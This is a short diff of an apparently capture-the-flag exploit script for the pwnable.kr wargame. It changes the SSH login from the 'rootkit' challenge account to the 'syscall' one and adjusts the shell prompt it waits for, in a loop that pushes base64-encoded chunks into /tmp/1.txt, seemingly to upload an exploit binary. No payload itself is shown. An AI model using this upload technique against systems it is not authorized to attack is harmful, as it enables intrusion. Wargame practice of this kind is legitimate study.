@@ -5,8 +5,8 @@ from pwn import *
 import sys
 import base64
 
-h = ssh(
-    user = 'rootkit',
+sh = ssh(
+    user = 'syscall',
     password = 'guest',
     host = 'pwnable.kr',
     port = 2222
@@ -24,7 +24,7 @@ print len(bc)
 while i < len(bc):
     b = bc[i:i+size]
     command = 'echo -n "%s" >> /tmp/1.txt;'%b
-    r.recvuntil('/ # ')
+    r.recvuntil('/ $ ')
     r.sendline(command)
     print i
     i +=size
